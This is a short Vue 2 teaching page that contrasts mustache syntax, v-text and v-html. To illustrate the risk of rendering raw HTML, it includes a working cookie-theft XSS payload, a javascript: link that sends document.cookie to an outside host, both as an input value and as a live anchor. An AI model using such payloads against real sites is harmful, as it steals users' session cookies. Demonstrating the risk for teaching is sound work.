<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v-html</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <script type="text/javascript" src="../js/dayjs.min.js"></script>
</head>
<body>
<div id="root">
    <span>{{}}语法</span>
    <h3>{{str}}</h3>
    <br><br>

    <span>v-text 语法</span>
    <h3 v-text="str"></h3>
    <br><br>

    <span>v-html 语法（处理得了标签）</span>
    <input type="text" v-model="str2" value="<a href='javascript:location.href=\'https://www.baidu.com?cookies=\' + document.cookie'>快来瞧瞧啊！</a>">
    <h3 v-html="str2"></h3>
    <br><br>

    <a href="javascript:location.href='https://www.baidu.com?cookies=' + document.cookie">快来瞧瞧啊！</a>
    
</div>
<script type="application/javascript">
    const vm = new Vue({
        el: "#root",
        data: {
            str: "Hello, Vue2!",
            str2: "<a href=''>Hello, Vue2!</a>"
        }
    })
</script>
</body>
</html>
